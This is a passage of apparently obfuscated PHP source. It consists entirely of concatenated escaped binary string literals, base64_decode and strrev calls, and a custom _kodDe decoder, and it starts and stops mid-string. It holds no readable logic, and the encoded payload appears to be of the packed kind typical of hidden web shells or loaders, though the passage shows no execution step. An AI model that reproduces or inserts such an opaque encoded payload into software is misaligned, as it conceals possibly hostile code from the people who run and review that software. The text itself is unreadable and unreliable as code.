172\162\44\51\344\72\55\222\264\310\31\152\162\366\307\103".base64_decode('FlAl5K88uRyh+VxMnjSJDS7Dcj6xjsXxxcsSOkRoX7Qg+AjaWEx/42hfa82y0WiQk4Hyepw=').base64_decode('IbyqfIQSkxvsOJckRkKtCeXUKCJbhqnSPCoGVsg/Zl5xlM2GS2ki6SKs5VM0ZhUi8auaqlg=').base64_decode('JVWO7AI/nI3wsKBSjnF4uOVBwHhAui+2JRYVFbtgCZg/zYKDF5bDwpfO4sTUyggp0RkRwdo=')."\xe5\xa8\x17\x7\xc5\x62\x62\x28\xa1\xe0\xa\x3c\x12\xbb\x82\x69\x89\x57\x2c\xb\x29\xe8\x1c\x72\x17\x46\xba\xf6\x4e\x3c\x44\x9d\x46\x7e\xc4\xc8\xc7\xd\x2c\x57\x70\xc7\xc2\xfa\x26\x4d\xe8\xd4\x2c\x6b\x8\xf1\x4"."\260\375\115\233\66\115\21\273\263\140\16\360\242\27\41\212\264\23\175\323\315\5\313\36\150\365\36\270\101\366\144\215\374\200\264\161\13\221\47\352\34\316\52\165\15\112\162\165\14\12\222\100\304"."\x0\xc1\x3a\x87\x5\x91\xd1\x8a\x62\xac\x19\x75\xc2\x24\x82\xf7\xc1\xc2\x20\x22\x28\x81\xf5\x6b\x83\x82\x71\x71\xe4\x91\x68\x8c\x65\x8f\xb0\xd6\xcb\x9f\xce\x42\x69\xb0\xc5\x43\x7e\xdb\x50\xe3\xe5\xd5\xcc\x67\xaf".base64_decode('hFrOgChpQqQigsYK/ZCOJEwPlvejH7q9M0UCAsSWRSnXAvcH+HsZog+MX0MDXsPoCzAZqiQ=')."\46\340\364\311\311\46\320\226\4\70\331\107\34\175\26\355\162\105\37\136\102\113\360\136\305\306\204\122\77\31\45\343\72\352\47\24\57\112\210\227\245\311\320\102\332\207\267\1\261\155\360\73\64"."\xbe\x2\xc5\xf8\x8a\xe5\x96\x16\xd\xc2\xc3\xa9\x96\xb7\x3\x63\x70\xe5\x70\x6b\xd1\xe4\x4c\x2f\xdf\xf1\xdd\x40\x41\x72\xbe\xe4\xfa\x20\xae\x5d\x5a\x1a\xf\x7\x67\x51\x16\x25\xe5\x71\xf3\x18\xae\x58\x57\x10\xf3"."\x1d\x15\xf6\x21\x68\x26\xb9\xba\x29\xd2\xd\xcd\x87\x4e\xb\xa0\xd6\xe3\xa9\x93\xd8\x2f\x41\x7e\xd6\xd2\xeb\x33\xd8\x0\xcf\x74\xcd\xaf\x6d\x9a\xe8\x8\x5a\xf4\x15\x51\x8d\xa2\x21\x12\xe9\x3\xc2\x40\xd4\x3b\xe2".base64_decode('Wr8uMw2OxEChIJrNy7dQFom8O7kmVma8oDGqrngVVwlaoSDXyVk+hvDkgFLiEQrcjtJeiy4=').base64_decode('8bbShAjnlzFlCaUMG8fgpWqyuyUBKPZed2YRljcDsqeVoY04jHimOiCdDAhETiPMgk/wS5U=')."\x15\xa2\x92\x66\x1\x70\x49\x52\x12\xcc\x99\x83\xba\x14\x89\xaf\xf9\xa\x22\x45\xa\xd2\x64\x29\x49\x14\x2a\x41\xf1\xa9\x20\x2d\x42\x2b\x33\x45\xb8\x6c\x31\xa\x4\x16\xf2\x92\xc3\x3a\x5d\xfc\x3e\x7c\x28\xf1\xc9".base64_decode('JD5QLDLUp93EV9AoUo7ClDPO1m2ljZAWHhoUKoC0KFyxjxIOfM8ZzfP1Ir7LQWVRZeWC4uI=')."\xea\xdf\x19\xaa\xc\x1e\xc8\x66\x85\xb2\x96\x3b\x3c\x61\x16\x4a\x30\xe4\x4c\x72\xcc\x84\xd9\x5a\xc9\xf9\x98\xe9\x39\x54\x8a\xe3\x27\xa3\x89\xb9\x7d\xf7\x7d\xbb\x93\xc8\x4f\xcc\xc\x4d\x40\x1e\xc5\x34\x56\xe\xa3"."\x7d\x3d\x98\x31\xf2\x3a\x93\xe7\xf4\x1b\x45\xab\x12\xb5\xfb\xff\xcc\x75\x97\x8f\x3c\x5e\x21\x13\xa1\xb\x4e\x93\x84\xda\x58\x15\x79\x50\x97\x8f\x21\x5c\x8e\x2b\x48\x15\xdf\xf0\xcb\xd8\x18\x60\x25\xa4\x80\x6a\x3b".base64_decode('uLEYKV9aTg4MQcuXjgfe7MJRnzUBzrrhuGYLoYnDfI+WM+EkPJdyoYL7+xx4XrjgBGU4hLs=')."\70\141\242\266\262\144\136\312\123\373\306\336\276\146\37\375\336\175\373\243\327\76\370\17\372\75\173\26\334\371\243\277\203\230\70\111\350\242\237\277\142\304\74\356\77\217\71\364\364\277\257\235\173".strrev('Ϋ…ιRϋίk£ςϋµΝΏύώο¦υ±έΟ7KωύpΒό~—†Ϋ΄ι>ήλήφΆύ*¦Ϋuf·‘')."\x66\x9d\x7e\xcb\x21\xaf\xbc\x7c\xe0\xb7\xa7\x64\x36\x9c\x75\xe3\x7b\xbf\x7c\x78\xcf\x7\xcf\x3d\xb8\xe3\x87\x57\x7f\x7b\x43\x7a\xfc\x37\x37\x5e\x3f\xf4\xd9\x1b\xf\xfe\x7a\xe1\x3f\xdf\xd8\xf4\xd1\xa2\x7f\xfe\xf4"."\10\355\370\133\116\270\351\340\347\357\132\171\374\351\327\55\176\142\306\41\263\37\334\366\367\117\372\302\376\342\344\277\74\166\306\237\76\176\344\302\15\267\176\377\206\173\275\377\72\273\372\247\17".base64_decode('XPLX635b8+CFwbZPqz7p+eaKRP6cc/qqtmy69jv7bji48bqnhi86qPTD5e+fsGv/QR8+8Ic=').strrev('η»ΣΗu©Ύ›Σό=ξΊWυψ7οΝEoγ‹[υΝ:ήCαδn:ξV§¶κχ?')."\x66\xdf\xe0\x23\xf7\x4c\xd\xaf\x3f\x3c\xbc\xef\xa5\xb\x5e\xf4\xec\xbb\x7b\x63\xef\xa2\x3b\x8e\x99\x37\xff\x85\x39\xa7\x8e\x24\xf\x7a\x6f\x74\xc3\x89\x5a\xff\x8d\x67\xad\x3a\xf6\xf9\x7f\xcc\xfb\xe3\x93\xef\x84"."\x9f\x9b\xf6\xcd\xd2\xd6\x7\xae\x7e\x68\xf5\x35\x87\xb7\xbf\x7a\x57\xe9\xb8\xda\xd2\xeb\x9b\xee\x79\x7c\xf3\xfb\x43\x1f\x1f\x70\xdd\x4d\xb1\xf\x95\xba\xb\xcf\xbb\xb1\xe9\xb0\x8d\xdf\x78\x63\xd3\xf2\xf9\xff\x3a"."\372\350\217\217\33\71\350\200\133\337\171\355\256\347\215\45\37\27\57\76\361\264\323\237\134\377\253\322\61\373\57\30\76\274\171\153\303\206\137\154\337\320\376\323\276\117\177\376\336\21\343\207\237"."\73\171\375\372\217\242\365\365\153\17\74\322\363\165\373\240\205\133\263\157\277\170\301\364\357\235\177\305\241\27\74\160\321\61\315\123\56\172\174\356\235\57\57\355\333\252\375\360\232\143\214\372\47"."\x5e\xbb\xe3\xeb\x47\xde\x79\x41\xb0\x7f\xca\xc2\xb\xbf\xfe\xc0\xb\xab\xfe\x3c\x69\xde\x39\x7b\x5f\xfe\xf3\xaa\x83\xef\x18\xc\x5e\xf0\x9d\x2d\x17\xd6\x6f\x3c\xe6\xce\x83\x9f\xda\x76\xe8\x1d\xf3\x5a\xcf\x79\xf2"."\300\205\347\350\347\375\305\176\162\337\221\207\36\272\352\330\357\335\261\313\176\150\340\306\73\27\274\367\324\336\223\254\65\307\237\34\237\167\311\246\147\176\360\255\237\315\277\165\307\244\232\373\222"._kodDe('KxJixWMKVtjQ3W5ovKiMl7o2dbLKw+nQ5DykIbrtbnms8uYu3ZvdEa5krObgEMpmSkzC6Ur3')."\x8e\x38\xc2\xf8\xe6\x2\xbd\xe6\xbc\xf6\x57\x8f\xbf\xab\xf6\xd0\xf1\xd6\xa7\x8a\x6f\x9d\xf5\x54\xcb\xc5\x77\xfe\xfc\xb4\xab\x2e\x7b\x32\xf2\xf3\x5e\x6b\x41\xe3\xd9\x2f\xce\x9a\xaf\x15\x47\x5f\x6c\xfd\x4d\x62\xf0"."\117\117\152\263\67\277\262\360\371\323\46\377\347\255\67\46\147\26\276\155\35\160\106\317\211\65\217\355\237\253\174\371\203\340\271\213\37\215\354\15\176\273\321\36\271\375\236\43\176\351\367\36\376"."\37\366\167\306\236\72\244\357\327\307\277\65\255\147\131\353\354\206\157\55\336\177\312\350\233\7\175\71\62\267\270\376\345\363\356\72\342\351\117\77\70\350\260\326\33\147\315\231\275\161\175\357\263"."\47\114\376\251\162\307\266\371\37\134\162\367\303\213\317\211\125\375\355\221\266\302\75\47\77\341\371\332\340\171\173\16\74\141\351\21\117\117\131\376\302\155\333\337\175\261\346\220\145\107\66\254\372"."\362\316\63\252\56\370\326\37\24\173\70\175\136\357\247\343\77\371\355\125\57\135\331\274\64\273\346\225\143\57\11\137\167\357\246\276\326\360\334\300\167\217\264\23\13\136\372\351\5\167\177\355\325"."\xb1\xb3\x6e\xbf\xad\xf4\xcc\xb9\xbd\x6b\x8e\x99\xb2\x70\x6b\xdb\x6f\x9a\xda\xef\x4f\xde\x7d\x75\xfc\xef\xbd\x7f\xba\xfc\x9a\xaf\xd4\x5f\x71\x5d\xf3\xba\x86\xd8\xba\x27\x67\x76\xed\x5a\xb5\xee\xae\x6d\x7\x1e\xba"."\xed\x99\x17\x6e\xba\xe5\xb4\xd6\x17\xee\x3e\xc0\x7a\x64\xf4\xf9\x8c\x31\xd6\xbf\xf5\xcc\xfb\x66\xbd\x72\xd3\x60\xcf\xab\xbb\x46\x3f\xdc\xb7\xea\xc1\x55\x27\xfd\xe9\xeb\x5b\x6a\xfb\xaa\x6\xe\x8d\xfd\x70\xdd\xaf"."\257\135\334\273\75\365\361\45\33\356\73\172\322\257\156\270\67\66\160\313\354\346\360\241\163\365\15\17\375\375\246\133\177\173\314\246\365\307\77\167\334\346\251\53\316\72\345\252\157\275\361\314\224"."\x47\xf6\x7b\xc7\x1a\x8e\xff\xed\x94\x5f\x1f\x7f\xe8\x8e\x95\x7\xad\xb5\x76\xad\xbd\x34\xf3\xcd\xfa\xd6\x3f\x5c\x9e\xbf\xf4\xfd\xee\x93\x77\x4e\xb5\x6e\xfe\xea\xa7\x77\x9c\x7b\xe7\xdb\x67\xbc\xd2\xf7\x60\xcb\xfa"."\65\257\7\16\217\236\364\307\37\250\133\347\77\365\365\257\56\175\163\326\253\137\377\341\252\23\237\13\52\377\365\346\117\217\134\376\343\73\162\377\330\361\360\217\376\160\357\61\243\227\151\63\377".strrev('Γώ“=ρ¬ν6„£τυ½3άϊΨωώ›ΑΚyο'."\n".'+ιKψoχ›Ζ•Κσ8¬]ΞwΤΞπ½Έ')."\357\237\373\306\316\253\267\374\343\325\256\17\357\336\365\376\275\117\134\272\370\260\43\377\371\306\237\127\75\377\302\350\117\106\357\137\376\376\244\111\255\117\226\364\313\262\17\355\77\350\233\15\247"."\353\17\277\266\372\367\67\204\333\376\372\310\51\107\36\326\365\275\215\17\34\370\374\201\307\6\317\337\376\360\71\245\217\276\377\324\243\353\13\112\142\345\332\165\3\157\36\334\365\267\324\314\313".base64_decode('Zl8SmvLM+Kmef/WuOXH5pqH7p781f2gk+OJXTzz9r/+5wTy/dNif8s0XfP2aSb/zPHDh5NA=').strrev('ϋΉF³ργ<ξχχσύΩΦώ›ήΏΑΎ„δόΫNWAήbΟ,ζΣ½άr]w7ΪeΗψ\'ήγϋ')."\xae\x37\x17\x9e\xbd\xe6\x93\xfd\x9f\xac\x5d\xbe\x65\x67\xe3\xd9\xff\xbc\xfc\x6f\x87\xab\x3d\xeb\xf6\x5d\xfb\xec\xb5\x5b\x7c\x67\xff\xfb\x92\x43\x16\xbe\xb5\x73\xc9\x67\x6f\x1f\x7e\xd6\x7d\x9b\x5e\x5d\x14\x7e\x25".base64_decode('eknTjbH68+euv/y+w2p/9s/t3/zSyd+feukD/7jqkPbBczTjqL+ctOf0Ge995dh3jhid/sI=').base64_decode('1N+/fNZhW7Zuy5530Zlfjm985MpV3/iNsWqy76opxcO+c8IzH98a+0HzC00v3rDgmcd2/Hg=')."\337\360\207\273\176\264\354\231\213\36\352\256\331\274\350\214\225\335\257\277\171\357\77\356\235\372\354\202\360\265\337\372\315\320\272\334\224\237\135\171\373\224\35\53\276\366\316\55\167\35\173\362\316"."\x23\xef\x79\x66\xd2\xef\x4e\xfc\xd5\x97\x95\x86\x8d\x7\x8c\x9c\x72\xf2\x43\xbf\x4c\xa5\x8e\xe9\xfb\xd0\x5a\x96\xee\xff\x6a\x8b\xf7\xc8\xd\x55\x47\xc\x9e\xf2\x41\xaa\xe7\xaa\xb9\xe6\x4b\x97\xa5\x56\x7e\x32\xba"."\xf5\xc6\xfa\xf\xf\xfd\xc1\x85\x93\xda\xdf\x3f\x24\xb9\xf3\x6f\x3\xdf\xd9\xb3\xc7\xb3\xf7\xee\xb5\xb7\x1d\x3d\xe5\xe8\x8e\x6d\xff\xb5\xed\xcd\xc2\xdb\xef\x7f\x3c\x6f\xdf\x47\xff\x5e\xf0\xda\xe4\xa7\x6e\xc\x15"."\56\261\236\376\315\115\365\133\32\67\335\176\124\303\263\273\367\377\146\361\315\337\176\367\254\107\366\75\260\371\243\253\33\12\203\203\257\35\376\350\325\177\276\357\201\327\337\230\377\252\247\161\177"."\152\340\371\354\362\107\77\371\316\75\267\377\354\73\115\117\334\374\333\271\233\366\146\177\367\352\75\137\233\271\145\331\226\252\353\256\177\355\127\217\254\335\161\334\374\246\113\366\75\372\331\367\357"."\37\332\265\154\371\251\277\177\264\146\337\125\223\157\377\361\314\205\127\266\117\336\161\322\346\357\176\60\343\132\377\212\35\55\53\337\274\156\322\161\227\236\370\372\252\171\347\315\233\174\336\47\373"."\xf7\x4d\x9a\x7b\xc8\x13\x81\xec\xe5\xcf\x3c\xf3\xe1\xb7\xdf\xfa\xc5\x7b\x3b\x6e\x3b\xe3\xe2\xf7\xdf\x78\xe7\xdc\x2b\xa6\x7c\x76\xc4\xa4\x9d\xdb\x2f\x5b\x31\x76\xed\xae\x63\xf7\x1f\x7d\xc5\xa9\x2b\x17\xf\x3e\xf3".strrev('XπΤtχνφ~/—³αTϊθ³ώήΟγυ~,=―Η•ψqΤΎWώσ‚υ·½vyφT/ϋD')."\xcb\x9f\xda\x6f\x6d\xda\xfa\x7a\x51\x49\xbe\x96\x7a\xbd\xff\xb1\xdb\x5e\x3e\xfe\x86\x5b\xbc\x2f\x1e\x3b\x7b\xff\x7\xd3\x9f\x3e\xe2\xc6\x7f\xbd\x36\xab\x6f\xd9\xc9\xfb\xbf\x3b\x79\xe7\x59\x3f\x7f\xfa\x7\x6f\x6e"."\363\114\255\276\154\74\367\255\77\376\271\271\256\372\354\167\332\136\374\135\357\322\243\327\376\367\351\335\375\372\57\236\377\313\155\333\63\137\355\375\44\376\344\307\113\346\334\364\253\326\311\317\55"."\370\371\261\241\67\257\377\332\121\67\116\372\306\17\357\271\345\113\276\305\326\233\373\266\176\320\375\373\366\326\226\227\266\377\307\217\316\274\64\165\324\312\125\137\365\74\173\360\256\375\243\265\57"."\314\135\166\300\141\103\157\345\126\76\172\130\103\52\365\345\366\124\117\367\54\165\374\316\47\116\233\365\347\355\57\375\372\303\131\167\36\76\130\114\367\236\76\172\354\301\307\257\263\37\152\132\167".strrev('[nΧύκφλp:|N[”π`~?^?Γ7³δΙ_‡›ήώύ:Σ™)Πϊuy^ιώ/fίΕ')."\366\207\23\26\175\163\152\376\244\203\327\235\130\173\342\313\273\172\376\246\114\131\172\136\313\316\225\327\30\347\134\236\273\107\71\161\376\272\227\177\171\107\325\111\376\77\64\75\342\335\365\337\211".strrev('ϊξ^Ρo―Ύχ9\\ommΨ•θϊO;γ―Gωc9κ7[ΥΫΚώN—ξχωΝ'."\n".'Ϊ±νO')."\335\155\367\325\137\373\333\177\237\365\327\17\356\275\344\315\263\316\372\144\314\377\333\105\373\367\177\266\150\347\274\177\177\272\351\331\313\157\356\375\354\255\233\337\174\342\323\277\177\366\307\153\265"."\xf0\xce\xd1\xfd\x9f\x7d\xac\xbe\x79\xde\xd9\x6f\x7e\xb6\xf7\xe3\xdf\x3f\xfb\x6c\x74\xd1\x82\x7f\x7f\xf2\xd1\x73\x8b\xfe\xb9\xe7\xe3\xf7\x77\xf6\x9e\xf9\xd7\x3f\x9e\xfd\xef\xff\x9e\xe7\xff\xf8\xb6\x6d\x3b\x7f\x7b"."\xc3\x8d\x27\x1c\x3c\x7e\x53\xe9\xec\x85\x5f\x7b\x7f\xf7\xc6\x1d\x73\xde\x18\x5f\x6b\xee\xf4\x67\x9f\xe8\xbd\x67\xd7\x7b\xf3\x77\x6c\x7c\xfc\xbf\xc7\x3\xf7\xbe\xbe\x77\xdf\xfe\x73\x7f\x76\xfb\x3b\xff\x75\xf8\x9".base64_decode('X3q97tZZ3/ljdfLd7S/feMTNX77rxT9+5rlW9R8958/Z/NUNQ2fXzDzmiSMnXX948itN69M=').base64_decode('85RL//OGpzeErMS6SWG7+xe/WB8Ybzixec7mN0/56u5/H3Ru18OLDziG2dPZpUFzdT/IiEA=').base64_decode('Kjw6kk33J+H2cVYD2ATBz8wZoFg1G7gpfWQ4m8mBzAz0ivqL6QFtGHi5uQ3zoCh2tCz19xU=')."\200\345\237\123\17\67\305\163\32\100\25\310\50\151\103\346\60\310\266\40\156\26\253\164\316\214\71\364\143\315\350\352\164\161\70\307\170\352\274\225\143\252\240\263\352\0\66\271\306\116\231\171\166"."\353\235\62\327\130\71\70\153\15\147\112\126\166\20\256\276\353\147\102\221\363\346\100\123\146\314\253\147\34\43\360\331\153\264\134\41\11\252\311\15\15\120\376\250\66\150\226\206\127\3\350\134\210"."\35\50\230\243\126\21\304\305\166\72\263\72\73\302\314\153\64\153\164\204\135\377\226\126\153\243\351\74\24\131\77\33\232\60\203\151\255\231\43\311\122\137\26\6\165\316\74\210\315\346\207\7\206"."\330\1\170\50\231\51\26\6\263\254\4\230\215\142\177\146\215\226\6\220\372\131\114\106\252\31\346\232\276\74\153\167\151\270\300\14\142\346\316\200\276\216\16\45\213\366\10\114\372\214\331\60\24"."\xda\xea\xdc\x40\xff\x30\x9c\x4a\xe6\xd6\x43\x25\x73\xe7\xb0\x8f\x7a\x36\x41\x2c\x69\xde\xbc\x3a\x36\x8d\xd9\xd5\x85\x7e\xb8\x3\x1d\x2a\xe5\xb2\x23\xc5\x51\x68\x15\x1b\xde\x79\xac\xee\x6\x56\xde\x10\x3a\xa1\x59".base64_decode('aTgOzayDUZkzB3BvjTEykExDy+eweZszlzV2OLOmNMJVdLIWP1nl01ppkJ0tGlj9xYHcoGU=')."\xf6\xb1\xa1\x87\x4a\x66\xc3\x60\xa7\x47\x8d\x91\x5c\x8a\xad\x8c\x59\x80\xc3\x73\x67\x42\xf2\x60\xdf\x8\x9a\x4f\x10\xb0\xcd\xa8\x87\xd8\x79\x73\xa1\x51\x33\xd9\xb2\x29\xac\xce\xe9\x76\x2a\xcf\xd0\x17\x7e\x59\x71"."\x7a\x31\x67\xad\x1e\x82\x51\xcf\x96\x32\x83\xda\xc0\x30\x6b\x25\x14\x59\x3f\x17\xc6\x58\xcf\xa2\xf9\x2e\x31\x5\xac\x51\x63\xf5\x50\x5f\x9a\xd\xef\x9a\x6c\x9a\x29\xcd\xcd\x98\x3d\x8f\x35\xa\x3a\x34\x13\xd6\xb5"."\x69\x65\x87\x47\xfa\x60\x32\x67\xb2\x29\x5e\xdd\x9f\x1e\x46\x67\x46\x8\x58\xf6\x40\xbe\x34\xc4\xe8\x40\xce\x30\xfb\x0\x9\x33\xd9\x41\x53\xcb\x15\xd9\x60\x41\xe6\xd9\x6c\xe6\x52\x7d\x6b\x4a\x76\x6\xf0\xd9\xd2"."\263\245\342\0\133\341\63\240\323\111\75\145\25\263\114\365\331\320\123\151\46\277\235\321\300\150\13\64\71\245\15\256\321\231\66\116\75\253\154\106\3\124\226\316\254\31\315\147\241\55\175\132\106"."\x2f\x15\xa1\xd8\xd9\xd\x30\xfe\x49\x63\xa0\x3f\x53\x82\xf5\x3e\x64\xaf\x4e\xe7\x47\xa0\x71\x46\xd1\xce\x27\x47\x80\xbe\xcc\x65\xb3\x5e\xca\x98\x96\xde\x7\xf0\x6b\x72\xab\x87\x52\xa3\x23\x6c\xd4\x8a\x69\x9d\x99"."\77\61\122\66\163\316\74\66\147\303\366\10\263\5\313\14\227\354\376\64\63\302\103\364\247\270\32\344\140\365\165\34\347\322\66\152\30\340\120\61\123\350\33\145\313\262\60\254\153\203\100\116\32"."\330\172\152\326\222\3\114\244\314\365\232\145\165\141\252\53\106\5\160\362\35\14\63\311\64\362\276\234\226\347\172\72\155\6\43\106\42\156\100\327\231\366\76\54\6\133\150\174\200\246\62\304\33"."\x39\x5d\x88\xc9\xe9\x65\x4\xcb\x29\xe\xef\x58\x72\x22\xe9\x8c\xe0\x60\x5c\x2e\x25\x99\xb7\xa5\x64\x14\x72\xa4\xc6\x65\x3\x3\xe8\x1d\x6e\xa1\x4f\xee\xf5\xca\x1c\x1b\xd0\xa\x77\x9e\x20\xdf\x95\x2f\xb4\x6\xcc"."\x54\x32\x6b\x96\x52\x8e\x52\x53\x7d\xbe\xa\x23\x49\x7b\x52\x29\xa5\xdf\x1d\xcf\x75\x8c\xfa\xa4\x59\x12\x85\x3b\x34\xe7\x59\x9c\x63\x4\x69\x3e\xd0\x6f\x59\xa2\xdb\x4a\xaa\x8f\xda\x5d\x5b\x4c\x2b\x89\x26\xa9\xe4"."\77\350\36\265\101\266\260\132\73\67\233\143\67\147\240\1\155\311\305\373\330\254\322\353\1\133\263\6\174\162\203\275\162\252\221\107\35\314\146\175\116\373\164\154\50\336\325\251\46\2\361\245\222"."\x66\x21\x36\x64\x76\x54\x5f\xd6\x59\x31\xcb\xd2\x90\xcb\x93\xed\x1c\x18\x86\x4c\x7b\xb6\xec\x18\xbb\xfc\x9a\xf1\xab\x1f\x18\xdf\xb8\x79\xec\xd1\x4d\x7b\x36\x3f\x30\xf6\xf8\xd5\x28\xf8\xee\xf6\xcb\xc6\x36\xff\x60"."\xef\xf5\xe7\xbf\xbb\x7d\xe3\xbb\xdb\xcf\xd9\x73\xe1\x43\x1f\x3d\x76\xe9\xd8\xe5\x5b\xf6\x9c\xfb\xf8\xd8\x4d\x77\x8f\xfd\xf0\xc2\x77\x77\x3c\xbe\x67\xe7\x85\xbb\xef\xbe\xe4\xdd\xed\xf7\x8f\xdf\x74\xd1\xd8\xf9\xdb"."\xde\xdd\x71\xcd\xd8\x77\x6f\x19\xbb\xf0\xf2\xf1\x4d\x1b\xdf\x7d\xfc\x26\x4\x3f\xfe\x5d\x51\x32\x2\x1b\xbb\xff\x3a\x9c\xf7\xb1\xd\x63\xdb\xb7\xef\xb9\xf5\x6e\x9e\xfa\xd1\x63\xeb\x61\x5d\x66\xc4\xf4\xc4\x4f\x8b"."\xb0\x89\x21\x18\xac\x2c\x54\x0\x77\x75\xcb\xa7\x74\x66\x75\x34\x62\x4a\x12\x5b\x6e\x61\xdd\x32\x3b\xa3\x17\x15\x9b\xe8\x98\x69\xe8\x2f\x6f\xe6\xbd\x14\x37\xd9\x1c\x1b\x79\x9c\xac\xb0\xb1\xf6\x71\xfc\x4d\xe8\xb9"."\2\306\102\30\45\77\65\264\25\106\32\101\42\226\124\372\264\1\205\12\377\151\253\174\302\70\234\130\164\132\302\115\202\207\65\13\313\347\225\2\332\167\14\13\153\34\53\146\77\66\52\122\360"."\x6d\x2\xc3\x36\xe7\x42\xa8\x34\x89\x34\xa1\x2\x2a\xe3\x99\x14\x98\x50\x83\x3f\x6b\x9d\x6d\x52\xb0\x78\x52\x41\xc\x49\x16\x5b\x69\xf6\xa3\xfc\xec\x5e\xa6\x57\xb1\x4d\xf6\x9d\x1b\xe1\xb8\xc5\xc6\x9d\x8c\x19\x74"."\213\366\266\342\262\255\210\135\274\275\14\303\322\374\26\101\10\267\241\7\222\21\20\275\101\52\303\154\102\7\234\104\314\101\41\234\344\117\116\162\16\31\110\237\211\172\205\107\241\115\361\220\231".base64_decode('8ChOw3asLsFUEHBfxLz6FJoOKjw0e2N554p6Icuv0oJmYYROBiCzPA2uTsYrDCjvpiMREY4=').base64_decode('kl0BUB53We5tmMEsItLiwpeoPogm06CQt+uWUJEv6imDqWXrOQIJtN0n3XZRyy+uG55E67M=')."\xe8\xb8\xc8\x5b\xb0\xa8\x90\x29\xe0\x81\xb4\xe7\x2f\x2\x23\xb\x66\x1d\x28\xb5\x1\xbe\x85\x91\x9b\x1c\x9b\x75\x5f\xe\xf2\xd5\xdc\xd2\x2c\x79\xf3\xc0\x60\x8d\x5e\xaf\x57\x12\x62\xb\xc5\x3c\xfc\xa5\xb2\x8e\x11"."\153\245\170\246\144\143\375\223\45\131\263\217\41\222\270\171\107\340\41\74\161\23\305\267\160\175\25\104\236\322\151\124\136\43\261\52\126\246\53\250\17\163\175\365\350\203\254\260\131\276\71\350\223"."\14\46\254\246\36\30\340\222\305\54\267\246\372\146\62\266\156\76\20\210\371\4\155\232\244\236\101\274\310\125\312\147\131\54\372\104\40\261\122\36\43\102\243\163\70\364\174\112\312\64\137\113\332"."\122\251\152\77\214\267\117\14\225\66\135\244\353\51\60\216\364\113\3\70\4\0\54\157\273\23\75\120\377\275\34\143\320\314\243\335\62\105\311\44\354\174\120\244\45\71\140\210\11\144\303\331\311"."\x70\x7d\x4e\x56\x5b\xc6\x86\x2\xda\x91\xf3\x5c\xe9\xd7\xca\x6a\xec\xfe\xd5\xc2\x36\x35\x79\x9d\xa3\x66\xc9\xe2\x57\x44\xcd\x81\x78\x38\xa8\x76\x6\x98\x1\x8b\x56\x28\xf8\xad\xd4\x80\xe5\xc7\x2a\xa6\xc6\xa0\x1e"."\x31\xfa\xfc\xd8\x3b\x3\xc6\x34\x1f\xf7\x5f\x40\x28\x23\xa7\x1a\xaa\xd6\xf\x86\xec\x61\xc9\x1a\x53\x45\x4c\x90\x25\xd1\x15\x35\xad\xdb\x2e\x9e\x81\x6c\x13\xaa\xd6\x67\x16\x6d\x36\x66\x68\x19\xa9\x29\x3\x1a\x17"."\11\67\253\55\341\230\124\106\241\124\126\206\344\214\47\320\31\126\343\361\250\324\35\60\143\132\32\155\121\203\321\350\322\60\254\220\106\211\346\143\3\126\241\32\200\103\302\220\25\337\222\311\132".base64_decode('gzKbh92kYP4kroB2LVqDwbZAjFs3zPLV+eoFLKpQxWYdTcz3QjwRiFVwlkOd6AA2gOMcyNA=').strrev('t΄PCfqI&W'."\n".'Y™DHξΑFu<§Jζd‡aΡ:RΆ;γCυ8φ®‘£®]')."\xee\x2a\x7\xf2\xd3\x80\x6c\x34\x25\x97\xc8\x4b\x82\xf5\xd3\xed\xa9\xee\xa9\xea\x99\xd6\x53\xd3\x53\xbb\xca\xd7\x63\xf5\xfa\xa5\x5d\xd8\x90\xa7\x7\x2\x9d\x2d\xd0\xbd\x46\xfe\x95\xb2\x0\xcf\xda\xe3\x68\xb7\xa6".base64_decode('n9FYIBhhTUFYDZ/RYJh+7L7qwXcfvWz3jZvHLtqIChq/YcP4tdsQb4f5uc2X7n7isvGrtow=')."\137\12\174\230\262\147\313\303\357\76\276\163\367\125\167\217\155\276\156\374\232\107\166\337\160\36\115\330\173\317\203\143\27\337\315\33\246\354\335\364\304\370\145\167\160\36\217\262\166\36\224\173\357"."\xf9\x1b\x77\x3f\xbe\x19\x73\x78\xb7\x9f\x33\xfe\x93\x4b\xc6\x6f\xda\x38\x76\xf1\xad\x63\xd7\xdf\xbd\xfb\xb2\x2d\x63\xb7\x9d\x3b\x76\xc1\xc6\x3d\x5b\xae\x3e\xc9\x8d\x48\x34\xdc\xcd\xa6\x2\x4c\xea\xfd\x67\x60\x77"."\x8\x74\x78\x7b\xac\xe9\x78\x68\x6b\xd1\x6f\xd\xb6\x79\x41\xbf\x4c\x75\x9f\x28\x71\x9f\xd6\x15\xea\x8\x86\xdc\x56\x63\x72\x10\xfc\xc\x4d\xa3\x18\x42\x15\x97\x80\xbd\xb7\xc0\x4f\x11\xb\x13\xbf\x24\x4d\xd5\x13"."\266\142\35\314\277\324\50\251\61\55\241\170\60\26\156\16\201\125\5\237\250\251\204\271\2\335\23\24\33\217\55\343\337\334\310\270\314\57\224\122\303\220\271\126\161\164\104\363\45\315\154\51\227"."\47\215\125\252\260\26\135\225\7\123\53\142\302\246\124\341\75\36\105\350\330\211\102\15\366\32\103\164\261\253\127\126\173\352\74\365\265\12\70\215\242\71\300\125\224\122\5\52\375\74\237\243\22"."\117\237\43\124\357\251\253\125\252\12\3\125\320\56\61\256\250\365\52\205\264\24\315\123\3\15\226\233\53\140\21\31\263\354\242\146\40\272\246\44\75\74\212\347\107\277\16\367\117\111\237\310\101".strrev('QD57Ο„ΉΡ:LΤ`Η&ζΙ"B¥VΐϊU®®i°ΟέΝI±&¬κz’‹G@”γΈA	η')."\250\145\42\155\226\146\261\211\202\130\62\125\70\226\316\26\203\65\121\67\320\344\120\170\364\301\123\260\241\6\57\11\221\43\236\300\146\20\307\363\111\254\220\106\334\171\125\121\136\224\366\63\147"."\245\31\251\3\337\10\355\53\171\37\30\56\163\255\60\356\14\14\333\130\206\22\301\66\212\345\161\11\315\123\175\123\35\210\52\206\123\161\240\10\77\171\1\34\135\56\230\40\114\42\160\341\16"."\x6c\x80\x4b\x6d\xb\xe3\xc1\xb6\x50\x7b\xc0\x7\x44\x9c\x62\x2\x85\xc7\xdc\x9f\xd2\xa4\x54\x63\xca\x47\xa3\xaa\x1d\xc3\x4f\x2a\x62\x43\x96\x20\xb5\xa2\x75\xa5\xda\x88\x5f\xa3\xa3\x50\x48\x43\x63\x60\xf6\x15\xe2"."\344\101\43\131\232\252\251\133\36\50\222\173\255\213\306\22\52\32\0\40\317\22\325\255\226\166\13\111\157\37\33\314\15\62\26\263\37\61\140\46\163\60\224\352\143\316\355\120\341\270\3